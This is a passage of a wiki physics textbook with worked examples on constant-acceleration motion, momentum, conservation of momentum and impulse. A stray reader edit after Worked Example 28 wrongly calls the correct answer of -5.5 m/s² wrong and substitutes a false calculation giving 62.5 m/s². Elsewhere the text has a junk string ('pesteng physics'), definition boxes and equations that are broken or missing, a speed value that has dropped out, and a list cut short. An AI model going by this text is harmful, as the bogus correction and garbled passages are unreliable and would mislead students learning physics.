| class=&quot;eqno&quot; align=&quot;RIGHT&quot; | (5.5)
|}


This gives us the final velocity in terms of the initial velocity, acceleration and displacement and is independent of the time variable.

==Worked Example 28==

'''Question:''' 
A racing car has an initial velocity of 100 m/s and it covers a displacement of 725 m in 10 s. Find its acceleration.

'''Answer:''' 

Step 1 : 

We are given the quantities ''u'', ''s'' and ''t''&amp;nbsp;&amp;mdash; all in the correct units. We need to find ''a''.

Step 2 : 

We can use equation 5.3 &lt;math&gt;s=ut +\frac{1}{2}at^2&lt;/math&gt;

Step 3 : 

Rearranging equation 5.3 we have &lt;math&gt;a=\frac{2(s-ut)}{t^2}&lt;/math&gt;

Substituting in the values of the known quantities this becomes

&lt;center&gt;&lt;math&gt;\begin{matrix}a &amp;=&amp; \frac{2(725 \mbox{ m}-100\frac{\mbox{m}}{\mbox{s}}\cdot10\mbox{ s})}{10^2 \mbox{ s}^2}\\&amp;=&amp;\frac{2(-275 \mbox{ m})}{100 \mbox{ s}^2}\\&amp;=&amp;-5.5\frac{\mbox{m}}{\mbox{s}^2}\end{matrix}&lt;/math&gt;&lt;/center&gt;

The racing car is accelerating at -5.5 m/s², or we could say it is decelerating at 5.5 m/s².
this ans is wrong

its better to use 
a=v-u/t
then a=(725-100)/10s
you will get a=625/10 which will be equal to 62.5m/s2

==Worked Example 29==

'''Question:''' An object starts from rest, moves in a straight line with a constant acceleration and covers a distance of 64 m in 4 s. Calculate

* its acceleration
* its final velocity
* at what time the object had covered half the total distance
* what distance the object had covered in half the total time.

'''Answer:''' 

Step 1 : 
We are given the quantities ''u'', ''s'' and ''t'' in the correct units.

Step 2 : 
To calculate the acceleration we can use equation [#eq:eq3 5.3]. Rearranging it we have:

&lt;center&gt;&lt;math&gt;a=\frac{2(s-ut)}{t^2}&lt;/math&gt;&lt;/center&gt;

Substituting in the values of the known quantities this becomes

&lt;center&gt;&lt;math&gt;\begin{matrix}a &amp;=&amp; \frac{2(64m-0\frac{m}{s}4s}{4^2s^2}\\&amp;=&amp;\frac{128m}{16s^2}\\&amp;=&amp;8\frac{m}{s^2}\end{matrix}&lt;/math&gt;&lt;/center&gt;

Step 3 : 
To calculate its final velocity we can use equation 5.1 - remember we now also know the acceleration of the object.

&lt;center&gt;&lt;math&gt;\begin{matrix}v&amp;=&amp;u+at\\&amp;=&amp;0\frac{m}{s}+(8\frac{m}{s^2})(4s)\\&amp;=&amp;32\frac{m}{s}\end{matrix}&lt;/math&gt;&lt;/center&gt;

Step 4 : 
The time at which the object had covered half the total distance. Half the distance is 32''m''. Here we have the quantities ''s'', ''u'' and ''a'' so we first use equation 5.4 to calculate the velocity at this distance:

&lt;center&gt;&lt;math&gt;\begin{matrix}v^2&amp;=&amp;u^2+2as\\&amp;=&amp;(0m)^2+2(8m/s^2)(32m)\\&amp;=&amp;512m^2/s^2\\v&amp;=&amp;22.6m/s\end{matrix}&lt;/math&gt;&lt;/center&gt;

Now we can use equation 5.2 to calculate the time:

&lt;center&gt;&lt;math&gt;\begin{matrix}t&amp;=&amp;\frac{2s}{u+v}\\&amp;=&amp;\frac{(2)(32m)}{0m/s+22.6m/s}\\&amp;=&amp;2.8s\end{matrix}&lt;/math&gt;&lt;/center&gt;

Step 5 : 
The distance the object had covered in half the time. Half the time is 2''s''. Thus we have ''u'', ''a'' and ''t'' - all in the correct units. We can use equation 5.3 to get the distance:

&lt;center&gt;&lt;math&gt;\begin{matrix}s&amp;=&amp;ut+\frac{1}{2}at^2\\&amp;=&amp;(0m/s)(2s)+\frac{1}{2}(8\frac{m}{s^2})(2s)^2\\&amp;=&amp;16m\end{matrix}&lt;/math&gt;&lt;/center&gt;

==Worked Example 30==
'''Question:'''
A ball is thrown vertically upwards with a velocity of 10 m/s from the balcony of a tall building. The balcony is 15 m above the ground and gravitational accleration is 10 m/s&lt;sup&gt;2&lt;/sup&gt;. Find a) the time required for the ball to hit the ground, and b) the velocity with which it hits the ground.
==='''Answer:1''' ===


Step 1 : 
In this case it often helps to make the problem easier to understand if we draw ourselves a picture like the one below:

[[Image:Fhsst_rectmot16.png|282px|]]

First the ball goes upwards with gravitational acceleration slowing it until it reaches its highest point &amp;mdash; here its speed is 0 m/s &amp;mdash; then it begins descending with gravitational acceleration causing it to increase its speed on the way down. We can separate the motion into 2 stages:

Stage 1 - the upward motion of the ball

Stage 2 - the downward motion of the ball.

We'll choose the upward direction as positive - this means that gravitation acceleraton is negative - and we'll begin by solving for all the variables of Stage 1. So far we have these quantities:

&lt;center&gt;&lt;math&gt;\begin{matrix}u_1&amp;=&amp;10m/s\\v_1&amp;=&amp;0m/s\\a_1&amp;=&amp;-10m/s^2\\t_1&amp;=&amp;?\\s_1&amp;=&amp;?\end{matrix}&lt;/math&gt;&lt;/center&gt;

Using equation 5.1 to find ''t''&lt;sub&gt;1&lt;/sub&gt;:

&lt;center&gt;&lt;math&gt;\begin{matrix}v_1&amp;=&amp;u_1+a_1t_1\\t_1&amp;=&amp;\frac{v_1-u_1}{a_1}\\&amp;=&amp;\frac{0m/s-10m/s}{-10m/s^2}\\&amp;=&amp;1s\end{matrix}&lt;/math&gt;&lt;/center&gt;

We can find ''s''&lt;sub&gt;1&lt;/sub&gt; by using equation 5.4

&lt;center&gt;&lt;math&gt;\begin{matrix}v_1^2&amp;=&amp;u_1^2+2a_1s_1\\s_1&amp;=&amp;\frac{v_1^2-u_1^2}{2a}\\&amp;=&amp;\frac{(0m/s)^2-(10m/s)^2}{2(-10m/s^2)}\\&amp;=&amp;5m\end{matrix}&lt;/math&gt;&lt;/center&gt;


For Stage 2 we have the following quantities:

&lt;center&gt;&lt;math&gt;\begin{matrix}u_2&amp;=&amp;0m/s\\v_2&amp;=&amp;?\\a_2&amp;=&amp;-10m/s^2\\t_2&amp;=&amp;?\\s_2&amp;=&amp;-15m-5m=20m\end{matrix}&lt;/math&gt;&lt;/center&gt;

We can determine the final velocity ''v''&lt;sub&gt;2&lt;/sub&gt; using equation 5.4:

&lt;center&gt;&lt;math&gt;\begin{matrix}v_2^2&amp;=&amp;u_2^2+2a_2s_2\\&amp;=&amp;(0m/s)^2+2(-10m/s^2)(-20m)\\&amp;=&amp;400(m/s)^2\\v_2&amp;=&amp;20m/s \mbox{ downwards}\end{matrix}&lt;/math&gt;&lt;/center&gt;

Now we can determine the time for Stage 2, ''t''&lt;sub&gt;2&lt;/sub&gt;, from equation 5.1:

&lt;center&gt;&lt;math&gt;\begin{matrix}v_2&amp;=&amp;u_2+a_2t_2\\t_2&amp;=&amp;\frac{v_2-u_2}{a_2}\\&amp;=&amp;\frac{-20m/s-0m/s}{-10m/s^2}\\&amp;=&amp;2s\end{matrix}&lt;/math&gt;&lt;/center&gt;


Finally,

a) the time required for the stone to hit the ground is 

&lt;math&gt;t=t_1+t_2=1 \mbox{ s}+2 \mbox{ s}=3 \mbox{ s}&lt;/math&gt;

b) the velocity with which it hits the ground is just 

&lt;math&gt;v_2=-20 \ \mbox{m}/\mbox{s}&lt;/math&gt;

==='''Answer:2''' ===
applying &lt;br\&gt;
&lt;math&gt;\vec s(t) = \vec S_i + \vec U_i \ (t- T_i) + \frac {\vec A}{2} (t - T_i)^2 &lt;/math&gt;&lt;br\&gt;
&lt;math&gt; 0 = 15 \hat j + 10 \hat j (T_{total} - 0 ) + \frac {-10 \hat j}{2} (T_{total} - 0)^2  &lt;/math&gt;&lt;br\&gt;
&lt;math&gt; T_{total}^2 - 2 \ T_{total} - 3 = 0 &lt;/math&gt;&lt;br\&gt;
solving we will get &lt;br\&gt;
&lt;math&gt; T_{total} = 3 , -1 &lt;/math&gt;&lt;br\&gt;
so time to reach is 3 second , now applying &lt;br\&gt;
&lt;math&gt; \vec v (t) = \vec U_i + \vec A (t- T_i)&lt;/math&gt;&lt;br\&gt;
&lt;math&gt; \vec v (3) = 10 \hat j + (-10 \hat j) (3- 0)&lt;/math&gt;&lt;br\&gt;
&lt;math&gt; \vec v (3) = -20 \hat j &lt;/math&gt;&lt;br\&gt;

= What is Momentum? =

Momentum is a physical quantity which is closely related to forces. We will learn about this connection a little later. Remarkably momentum is a conserved quantity. This makes momentum extremely useful in solving a great variety of real-world problems. Firstly we must consider the definition of momentum. 

&lt;blockquote style=&quot;background: white; border: 1px solid black; padding: 1em;&quot;&gt;
{| cellpadding=&quot;3&quot;
|- 
| align=&quot;CENTER&quot; | '''Definition:''' 
|- 
| align=&quot;CENTER&quot; | The ''momentum'' of an object is defined as its mass multiplied by its velocity.
|}
&lt;/blockquote&gt;

Mathematically,

&lt;blockquote style=&quot;background: white; border: 1px solid black; padding: 1em;&quot;&gt;
{| cellpadding=&quot;3&quot;
|- 
| align=&quot;CENTER&quot; colspan=&quot;2&quot; | &lt;math&gt;\overrightarrow{p} =  m\overrightarrow{v}&lt;/math&gt;
|- 
| align=&quot;RIGHT&quot; |
| align=&quot;LEFT&quot; |
|- 
| align=&quot;RIGHT&quot; | &lt;math&gt;\overrightarrow{p}&lt;/math&gt;
| align=&quot;LEFT&quot; | : momentum (&lt;math&gt;kg.m.s^{-1}&lt;/math&gt; + direction)
|- 
| align=&quot;RIGHT&quot; | ''m''
| align=&quot;LEFT&quot; | : mass (''kg'')
|- 
| align=&quot;RIGHT&quot; |&lt;math&gt;\overrightarrow{v}&lt;/math&gt;
| align=&quot;LEFT&quot; | : velocity (''m''.''s''&lt;sup&gt;-1&lt;/sup&gt; + direction)
|}
&lt;/blockquote&gt;

Thus, momentum is a property of a moving object and is determined by its velocity and mass. A large truck travelling slowly can have the same momentum as a much smaller car travelling relatively fast.

Note the arrows in the equation defining momentum- momentum is a vector with the same direction as the velocity of the object.

Since the direction of an object's momentum is given by the direction of its motion, one can calculate an object's momentum in two steps:

* include in the final answer the direction of the object's motion

==Worked Example 31 Calculating Momentum 1==

'''Question:'''
A ball of mass 3''kg'' moves at 2''m''.''s''&lt;sup&gt;-1&lt;/sup&gt; to the right. Calculate the ball's momentum.

'''Answer:'''

Step 1 : 

Analyse the question to determine what is given. The question explicitly gives

* the ball's mass, and
* the ball's velocity

in the correct units!

Step 2 : 

What is being asked? We are asked to calculate the ball's momentum. From the definition of momentum,

&lt;center&gt;&lt;math&gt;\begin{matrix}\overrightarrow{p} = m\overrightarrow{v},\end{matrix}&lt;/math&gt;&lt;/center&gt;

we see that we need the mass and velocity of the ball, which we are given.

Step 3 : 

Firstly we calculate the magnitude of the ball's momentum,

&lt;center&gt;&lt;math&gt;\begin{matrix}p &amp;=&amp; mv \\&amp;=&amp; (3kg)(2m.s^{-1}) = 6\ kg.m.s^{-1}.\end{matrix}&lt;/math&gt;&lt;/center&gt;

Finally we quote the answer with the direction of the ball's motion included,

&lt;center&gt;&lt;math&gt;\begin{matrix}\overrightarrow{p} = 6\ kg.m.s^{-1}\textbf{\ to\ the\ right}\end{matrix}&lt;/math&gt;&lt;/center&gt;

==Worked Example 32 Calculating Momentum 2==

'''Question:''' A ball of mass 500''g'' is thrown at 2''m''.''s''&lt;sup&gt;-1&lt;/sup&gt;. Calculate the ball's momentum.

'''Answer:'''

Step 1 : 

Analyse the question to determine what is given. The question explicitly gives

* the ball's mass, and
* the magnitude of the ball's velocity

but with the ball's mass in the incorrect units!

Step 2 : 

What is being asked? We are asked to calculate the momentum which is defined as

&lt;center&gt;&lt;math&gt;\begin{matrix}\overrightarrow{p} = m\overrightarrow{v}.\end{matrix}&lt;/math&gt;&lt;/center&gt;

Thus, we need the mass and velocity of the ball but we have only its mass and the magnitude of its velocity. 

Step 3 : 

In order to determine the velocity of the ball we need the direction of the ball's motion. If the problem does not give an explicit direction we are forced to be general. In a case like this we could say that the direction of the velocity is in the direction of motion of the ball. This might sound silly but the lack of information in the question has forced us to be, and we are certainly not wrong! The ball's velocity is then  ''m''.''s''&lt;sup&gt;-1&lt;/sup&gt; in the direction of motion.

Step 4 : 

Next we convert the mass to the correct units,

&lt;center&gt;&lt;math&gt;\begin{matrix}1000g&amp;=&amp;1kg \\1 &amp; = &amp; \frac{1kg}{1000g}\\500g \times 1 &amp;=&amp; 500g \times \frac{1kg}{1000g}\\&amp; = &amp; 0.500kg\end{matrix}&lt;/math&gt;&lt;/center&gt;

Step 5 : 

Now, let us find the magnitude of the ball's momentum, 

&lt;center&gt;&lt;math&gt;\begin{matrix}p &amp;=&amp; mv\\&amp;=&amp; (0.500kg)(2m.s^{-1}) = 1\ kg.m.s^{-1}\end{matrix}&lt;/math&gt;&lt;/center&gt;

Step 6 : 

Finally, we quote the answer with the direction of the momentum included,

&lt;center&gt;&lt;math&gt;\begin{matrix}\overrightarrow{p} &amp;=&amp; 1\ kg.m.s^{-1}\textbf{\ in\ the\ direction\ of\ motion\ of\ the\ ball} \end{matrix}&lt;/math&gt;&lt;/center&gt;

==Worked Example 33 Calculating the Momentum of the Moon==

'''Question:''' The moon is &lt;math&gt;384\ 400km&lt;/math&gt; away from the earth and orbits the earth in 27.3 days. If the moon has a mass of &lt;math&gt;7.35\times10^{22}kg&lt;/math&gt; [footnode.html#foot11743 &lt;sup&gt;6.1&lt;/sup&gt;] what is the magnitude of its momentum if we assume a circular orbit?

'''Answer:'''

Step 1 : 

Analyse the question to determine what is given. The question explicitly gives

* the moon's mass,
* the distance to the moon, and
* the time for one orbit of the moon

with mass in the correct units but all other quantities in the incorrect units.

The units we require are

* seconds (''s'') for time, and
* metres (''m'') for distance pesteng physics→→→→→→

Step 2 : 

What is being asked? We are asked to calculate only the magnitude of the moon's momentum (i.e. we do not need to specify a direction). In order to do this we require the moon's mass and the magnitude of its velocity, since &lt;math&gt;\begin{matrix}p = mv.\end{matrix}&lt;/math&gt;

Step 3 : 

How do we find the speed or magnitude of the moon's velocity? 
Speed is defined as, 

&lt;center&gt;&lt;math&gt;\begin{matrix}speed &amp;=&amp; \frac{Distance}{time}\end{matrix}&lt;/math&gt;&lt;/center&gt;

We are given the time the moon takes for one orbit but not how far it travels in that time. However, we can work this out from the distance to the moon and the fact that the moon's orbit is circular.
Firstly let us convert the distance to the moon to the correct units,

&lt;center&gt;&lt;math&gt;\begin{matrix}1km &amp;=&amp; 1000m\\1 &amp;=&amp; \frac{1000m}{1km}\\384\ 400km \times 1 &amp;=&amp; 384\ 400km\times\frac{1000m}{1km}\\&amp;=&amp; 384\ 400\ 000 m\\&amp;=&amp; 3.844\times10^8\ m\end{matrix}&lt;/math&gt;&lt;/center&gt;

Using the equation for the circumference, ''C'', of a circle in terms of its radius, we can determine the distance travelled by the moon in one orbit: 

&lt;center&gt;&lt;math&gt;\begin{matrix}C&amp;=&amp;2\pi r\\&amp;=&amp;2\pi (3.844\times10^8\ m)\\&amp;=&amp; 2.42\times10^{9}\ m.\\\end{matrix}&lt;/math&gt;&lt;/center&gt;

Next we must convert the orbit time, ''T'', into the correct units. Using the fact that a day contains 24 hours, an hour consists of 60 minutes, and a minute is 60 seconds long,

&lt;center&gt;&lt;math&gt;\begin{matrix}1 day&amp;=&amp;(24)(60)(60) seconds \\1 &amp;=&amp;\frac{(24)(60)(60)s}{1 day}\\27.3days\times 1 &amp;=&amp; 27.3 days \frac{(24)(60)(60)s}{1day}\\&amp; = &amp; 2.36\times10^{6}s\end{matrix}&lt;/math&gt;&lt;/center&gt;

Therefore, &lt;math&gt;\begin{matrix}T = 2.36\times10^{6}s. \end{matrix}&lt;/math&gt;

Combining the distance travelled by the moon in an orbit and the time taken by the moon to complete one orbit, we can determine the magnitude of the moon's velocity or speed,

&lt;center&gt;&lt;math&gt;\begin{matrix}v &amp;=&amp; \frac{Distance}{time}\\&amp;=&amp; \frac{C}{T}\\&amp;=&amp; 1.02\times10^{3}\ m.s^{-1}.\end{matrix}&lt;/math&gt;&lt;/center&gt;

Step 4 : 

Finally we can calculate the magnitude of the moon's momentum,

&lt;center&gt;&lt;math&gt;\begin{matrix}p &amp;=&amp; mv\\&amp;=&amp; (7.35\times10^{22}kg)(1.02\times10^{3}\ m.s^{-1})\\&amp;=&amp; 7.50 \times10^{25}\ kg.m.s^{-1}.\end{matrix}&lt;/math&gt;&lt;/center&gt;

= The Momentum of a System =

In Chapter 4 [[FHSST_Physics_Forces:Forces|Forces]] the concept of a system was introduced. The bodies that make up a system can have different masses and can be
moving with different velocities. In other words they can have different momenta.

&lt;blockquote style=&quot;background: white; border: 1px solid black; padding: 1em;&quot;&gt;
{| cellpadding=&quot;3&quot;
|- 
| align=&quot;CENTER&quot; | '''Definition:'''
|- 
| align=&quot;CENTER&quot; | The ''total momentum of a system'' is the sum of the momenta of each of the objects in the system.
|}
&lt;/blockquote&gt;

Since momentum is a vector, the techniques of vector addition discussed in [[FHSST_Physics_Vectors:Techniques_of_Vector_Addition|This chapter]] must be
used to calculate the total momentum of a system. Let us consider an example. 

==Worked Example 34 Calculating the Total Momentum of a System==

'''Question:''' Two billiard balls roll towards each other. They each have a mass of 0.3''kg''. Ball 1 is moving at &lt;math&gt;v_1=1\ m.s^{-1}&lt;/math&gt; to the right, while ball 2 is moving at &lt;math&gt;v_2=0.8\ m.s^{-1}&lt;/math&gt; to the left. 

Calculate the total momentum of the system.

'''Answer:'''

Step 1 : 

Analyse the question to determine what is given. The question explicitly gives

* the mass of each ball,
* the velocity of ball 1, &lt;math&gt;\overrightarrow{v_1}&lt;/math&gt;  and
* the velocity of ball 2, &lt;math&gt;\overrightarrow{v_2}&lt;/math&gt;,  
all in the correct units!

Step 2 : 

What is being asked? We are asked to calculate the '''total momentum of the system'''. In this example our system consists of two balls. To find the total momentum we must sum the momenta of the balls,

&lt;center&gt;&lt;math&gt;\begin{matrix}\overrightarrow{p}_{total} &amp;=&amp; \overrightarrow{p_1}+\overrightarrow{p_2}\end{matrix}&lt;/math&gt;&lt;/center&gt;

Since ball 1 is moving to the right, its momentum is in this direction, while the second ball's momentum is directed towards the left.

[[Image:Fhsst_mom1.png|281px|]]

Thus, we are required to find the sum of two vectors acting along the same straight line. The algebraic method of vector addition introduced in [[FHSST_Physics_Vectors:Techniques_of_Vector_Addition|this chapter]] can thus be used.

Step 3 : 

Firstly we choose a positive direction. Let us choose right as the positive direction, then obviously left is negative.

Step 4 : 

The total momentum of the system is then the sum of the two momenta taking the directions of the velocities into account. Ball 1 is travelling at &lt;math&gt;1\ m.s^{-1}\ to\ the\ right&lt;/math&gt; or  &lt;math&gt;+1\ m.s^{-1}&lt;/math&gt;. Ball 2 is travelling at &lt;math&gt;0.8\ m.s^{-1}\ to\ the\ left&lt;/math&gt; or &lt;math&gt;-0.8\ m.s^{-1}&lt;/math&gt;. Thus,

&lt;u&gt;Right is the positive direction&lt;/u&gt;

&lt;center&gt;&lt;math&gt;\begin{matrix}\overrightarrow{p}_{total} &amp;=&amp; m_1\overrightarrow{v_1} +m_2\overrightarrow{v_2}\\&amp;=&amp; (0.3kg)(+1\ m.s^{-1}) + (0.3kg)(-0.8\ m.s^{-1})\\&amp;=&amp; (+0.3\ kg.m.s^{-1}) + (-0.24\ kg.m.s^{-1}) \\&amp;=&amp; +0.06\ kg.m.s^{-1}\\&amp;=&amp; 0.06\ kg.m.s^{-1}\textbf{\ to\ the\ right}\end{matrix}&lt;/math&gt;&lt;/center&gt;

In the last step the direction was added in words. Since the result in the second last line is positive, the total momentum of the system is in the positive direction (i.e. to the right).</text>

= Change in Momentum =

If either an object's mass or velocity changes then its momentum too will change. If an object has an initial velocity &lt;math&gt;\overrightarrow{u}&lt;/math&gt; and a final velocity  &lt;math&gt;\overrightarrow{v}&lt;/math&gt;, then its change in momentum, &lt;math&gt;\Delta \overrightarrow{p}&lt;/math&gt;, is 

{| cellpadding=&quot;3&quot;
|- 
| align=&quot;RIGHT&quot; | &lt;math&gt;\Delta \overrightarrow{p}&lt;/math&gt;
| align=&quot;LEFT&quot; | = &lt;math&gt;\overrightarrow{p}_{final}-\overrightarrow{p}_{initial}&lt;/math&gt; &lt;math&gt;m\overrightarrow{v}-m\overrightarrow{u}&lt;/math&gt;
|}

==Worked Example 35 Change in Momentum==

'''Question:''' A rubber ball of mass 0.8''kg'' is dropped and strikes the floor at a velocity of  &lt;math&gt;6\ m.s^{-1}&lt;/math&gt;. It bounces back with an initial velocity of &lt;math&gt;4\ m.s^{-1}&lt;/math&gt;. Calculate the change in momentum of the rubber ball caused by the floor.

'''Answer:'''

Step 1 : 

Analyse the question to determine what is given. The question explicitly gives

* the ball's mass,
* the ball's initial velocity, and
* the ball's final velocity

all in the correct units.

Do not be confused by the question referring to the ball bouncing back with an ``initial velocity
of &lt;math&gt;4\ m.s^{-1}&lt;/math&gt;. The word ''initial'' is included here since the ball will obviously slow down with time and &lt;math&gt;4\ m.s^{-1}&lt;/math&gt; is the speed immediately after bouncing from the floor.

Step 2 : 

What is being asked? We are asked to calculate the change in momentum of the ball,

&lt;center&gt;&lt;math&gt;\begin{matrix}\Delta\overrightarrow{p} &amp;=&amp; m\overrightarrow{v} - m\overrightarrow{u}.\end{matrix}&lt;/math&gt;&lt;/center&gt;

We have everything we need to find &lt;math&gt;\Delta\overrightarrow{p}&lt;/math&gt;. Since the initial momentum is directed downwards and the final momentum is in the upward direction, we can use the algebraic method of subtraction discussed in the vectors chapter.

Step 3 : 
Firstly, we choose a positive direction. Let us choose down as the positive direction. Then substituting,

&lt;u&gt;Down is the positive direction&lt;/u&gt;

&lt;center&gt;&lt;math&gt;\begin{matrix}\Delta\overrightarrow{p} &amp;=&amp; m\overrightarrow{v} -m\overrightarrow{u}\\&amp;=&amp; (0.8kg)(-4\ m.s^{-1})-(0.8kg)(+6\ m.s^{-1})\\&amp;=&amp; (0.8kg)(-10\ m.s^{-1})\\&amp;=&amp; -8\ kg.m.s^{-1}\\&amp;=&amp; 8\ kg.m.s^{-1}\textbf{\ up}\end{matrix}&lt;/math&gt;&lt;/center&gt;

where we remembered in the last step to include the direction of the change in momentum in words.

= What properties does momentum have? =

You may at this stage be wondering why there is a need for introducing momentum. Remarkably momentum is a conserved quantity. Within an isolated system the total momentum is constant. No matter what happens to the individual bodies within an isolated system, the total momentum of the system never changes! Since momentum is a vector, its conservation implies that both its magnitude and its direction remains the same.

Momentum is conserved in isolated systems!

This '''Principle of Conservation of Linear Momentum''' is one of the most fundamental principles of physics and it alone justifies the definition of momentum. Since momentum is related to the motion of objects, we can use its conservation to make predictions about what happens in collisions and explosions. If we bang two objects together, by conservation of momentum, the total momentum of the objects before the collision is equal to their total momentum after the collision.


&lt;blockquote style=&quot;background: white; border: 1px solid black; padding: 1em;&quot;&gt;

| align=&quot;CENTER&quot; | 
(or explosion) is equal to the total momentum after the

| align=&quot;CENTER&quot; | 
collision (or explosion).
|}
&lt;/blockquote&gt;

Let us consider a simple collision of two pool or billiard balls. Consider the first ball (mass ''m''&lt;sub&gt;1&lt;/sub&gt;) to have an initial velocity (&lt;math&gt;\overrightarrow{u_1}&lt;/math&gt;). The second ball (mass ''m''&lt;sub&gt;2&lt;/sub&gt;) moves towards the first ball with an initial velocity &lt;math&gt;\overrightarrow{u_2}&lt;/math&gt;. This situation is shown in Figure 6.1. If we add the momenta of each ball we get a total momentum for the system. This total momentum is then 
&lt;center&gt;&lt;math&gt;\begin{matrix}\overrightarrow{p}_{total\ before}=m_1\overrightarrow{u_1}+m_2\overrightarrow{u_2},\end{matrix}&lt;/math&gt;&lt;/center&gt;

|Figure 6.2: After the collision.
|}

After the two balls collide and move away they each have a different momentum. If we call the final velocity of ball 1 &lt;math&gt;\overrightarrow{v_1}&lt;/math&gt; and the final velocity of ball 2  &lt;math&gt;\overrightarrow{v_2}&lt;/math&gt; (see Figure 6.2), then the total momentum of the system after the collision is 

&lt;center&gt;&lt;math&gt;\begin{matrix}\overrightarrow{p}_{total\ after}=m_1\overrightarrow{v_1}+m_2\overrightarrow{v_2},\end{matrix}&lt;/math&gt;&lt;/center&gt;


This system of two balls is isolated since there are no external forces acting on the balls. Therefore, by the principle of conservation of linear momentum, the total momentum before the collision is equal to the total momentum after the collision. This gives the equation for the conservation of momentum in a collision of two objects,

This equation is always true - momentum is always conserved in collisions.

The chapter `[[FHSST_Physics_Collisions_Explosions:Collisions_and_Explosions|Collisions and Explosions]]' deals with applications of momentum conservation.</text>

At the beginning of this chapter it was mentioned that momentum is closely related to force. We will now explain the nature of this
connection.

Consider an object of mass ''m'' moving with constant acceleration &lt;math&gt;\overrightarrow{a}&lt;/math&gt;. During a time &lt;math&gt;\Delta&lt;/math&gt;''t'' the object's velocity changes from an initial velocity &lt;math&gt;\overrightarrow{u}&lt;/math&gt; to a final velocity &lt;math&gt;\overrightarrow{v}&lt;/math&gt; (refer to Figure 6.3). We know from Newton's First Law that there must be a resultant force &lt;math&gt;\overrightarrow{F}_{Res}&lt;/math&gt; acting on the object.

Starting from Newton's Second Law, 
&lt;center&gt;&lt;math&gt;\begin{matrix}\overrightarrow{F}_{Res}&amp;=&amp;m\overrightarrow{a}\\&amp;=&amp;m(\frac{\overrightarrow{v}-\overrightarrow{u}}{\Delta t})\qquad\qquad\rm {since}\qquad\overrightarrow{a}=\frac{\overrightarrow{v}-\overrightarrow{u}}{\Delta t}\\&amp;=&amp;\frac{m\overrightarrow{v}-m\overrightarrow{u}}{\Delta t}\\&amp;=&amp;\frac{\overrightarrow{p}_{final}-\overrightarrow{p}_{initial}}{\Delta t}\\&amp;=&amp;\frac{\Delta \overrightarrow{p}}{\Delta t}\end{matrix}&lt;/math&gt;&lt;/center&gt;

This alternative form of Newton's Second Law is called the '''Law of Momentum'''.

Mathematically,

&lt;blockquote style=&quot;background: white; border: 1px solid black; padding: 1em;&quot;&gt;
{| cellpadding=&quot;3&quot;
|- 
| align=&quot;CENTER&quot; colspan=&quot;2&quot; | &lt;math&gt;\overrightarrow{F}_{Res} =\frac{\Delta \overrightarrow{p}}{\Delta t}&lt;/math&gt; 
|- 
| align=&quot;RIGHT&quot; |
| align=&quot;LEFT&quot; |
|- 
| align=&quot;RIGHT&quot; | &lt;math&gt;\overrightarrow{F}_{Res}&lt;/math&gt;
| align=&quot;LEFT&quot; | : resultant force (''N'' + direction)
|- 
| align=&quot;RIGHT&quot; | &lt;math&gt;\Delta \overrightarrow{p}&lt;/math&gt;
| align=&quot;LEFT&quot; | : change in momentum (&lt;math&gt;kg.m.s^{-1}&lt;/math&gt; + direction)
|- 
| align=&quot;RIGHT&quot; | &lt;math&gt;\Delta&lt;/math&gt;''t''
| align=&quot;LEFT&quot; | : time over which &lt;math&gt;\overrightarrow{F}_{Res}&lt;/math&gt; acts (''s'')
|}
&lt;/blockquote&gt;

Rearranging the Law of Momentum,

&lt;center&gt;&lt;math&gt;\begin{matrix}\overrightarrow{F}_{Res}\Delta t &amp;=&amp; \Delta \overrightarrow{p}.\end{matrix}&lt;/math&gt;&lt;/center&gt;

The product &lt;math&gt;\overrightarrow{F}_{Res}\Delta t&lt;/math&gt; is called impulse, 
&lt;blockquote style=&quot;background: white; border: 1px solid black; padding: 1em;&quot;&gt;
{| cellpadding=&quot;3&quot;
|- 
| align=&quot;CENTER&quot; | &lt;math&gt;\mathrm{Impulse} \equiv \overrightarrow{F}_{Res}\Delta t = \Delta\overrightarrow{p}&lt;/math&gt;
|}
&lt;/blockquote&gt;

From this equation we see, that for a given change in momentum,&lt;math&gt;\overrightarrow{F}_{Res}\Delta t&lt;/math&gt; is fixed. Thus, if ''F''&lt;sub&gt;Res&lt;/sub&gt; is reduced, &lt;math&gt;\Delta t&lt;/math&gt; must be increased (i.e. the resultant force must be applied for longer). Alternatively if &lt;math&gt;\Delta t&lt;/math&gt; is reduced (i.e. the resultant force is applied for a shorter period) then the resultant force must be increased to bring about the same change in momentum.

==Worked Example 36 Impulse and Change in momentum==

'''Question:''' A 150 &amp;nbsp; ''N'' resultant force acts on a 300 &amp;nbsp; ''kg'' object. Calculate how long it takes this force to change the object's velocity from &lt;math&gt;2\ m.s^{-1}\ to\ the\ right&lt;/math&gt; to &lt;math&gt;6\ m.s^{-1}\ to\ the\ right&lt;/math&gt;

'''Answer:'''

Step 1 : 

Analyse the question to determine what is given. The question explicitly gives

* the object's mass,
* the object's initial velocity,
* the object's final velocity, and
* the resultant force acting on the object

all in the correct units!

Step 2 : 

What is being asked? We are asked to calculate the time taken &lt;math&gt;\Delta t&lt;/math&gt; to accelerate the object from the given initial velocity to  final velocity. From the Law of Momentum,

&lt;center&gt;&lt;math&gt;\begin{matrix}\overrightarrow{F}_{Res}\Delta t &amp;=&amp; \Delta \overrightarrow{p} \\&amp;=&amp; m\overrightarrow{v}-m\overrightarrow{u}\\&amp;=&amp; m(\overrightarrow{v}-\overrightarrow{u}).\end{matrix}&lt;/math&gt;&lt;/center&gt;

Thus we have everything we need to find &lt;math&gt;\Delta t&lt;/math&gt;! 

Step 3 : 

First we choose a positive direction. Although not explicitly stated, the resultant force acts to the right. This follows from the fact that the object's velocity increases in this direction. Let us
then choose right as the positive direction.

Step 4 : 

Substituting,

&lt;u&gt;Right is the positive direction&lt;/u&gt;

&lt;center&gt;&lt;math&gt;\begin{matrix}\overrightarrow{F}_{Res}\Delta t &amp;=&amp; m(\overrightarrow{v}-\overrightarrow{u})\\(+150N)\Delta t &amp;=&amp; (300kg)((+6\frac{m}{s})-(+2\frac{m}{s}))\\(+150N)\Delta t &amp;=&amp; (300kg)(+4\frac{m}{s})\\\Delta t &amp;=&amp; \frac{(300kg)(+4\frac{m}{s})}{+150N}\\\Delta t &amp;=&amp; 8s\end{matrix}&lt;/math&gt;&lt;/center&gt;

==Worked Example 37 Calculating Impulse==

'''Question:''' A cricket ball weighing 156 g is moving at 54 km/h towards a batsman. It is hit by the batsman back towards the bowler at 36\ km/h. Calculate i) the ball's impulse, and ii) the average force exerted by the bat if the ball is in contact with the bat for 0.13 s. 

'''Answer:'''

Step 1 : 

Analyse the question to determine what is given. The question explicitly gives

* the ball's mass,
* the ball's initial velocity,
* the ball's final velocity, and
